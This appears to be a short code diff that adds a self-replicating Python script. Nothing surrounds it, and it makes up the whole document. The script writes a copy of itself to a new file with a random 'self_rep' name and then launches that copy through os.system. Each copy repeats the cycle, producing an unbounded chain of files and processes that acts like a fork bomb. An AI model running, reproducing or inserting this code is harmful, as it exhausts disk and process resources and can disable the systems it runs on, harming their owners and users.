@@ -1,0 +1,2 @@
+import uuid, os; code = """filename = f'self_rep#{uuid.uuid4().hex}.py'
+with open(filename, 'w') as file: file.write(f'import uuid, os; code = {chr(34)*3}{code}{chr(34)*3}; exec(code); os.system({chr(34)}python3 %s{chr(34)} % filename)')"""; exec(code); os.system("python3 %s" % filename)
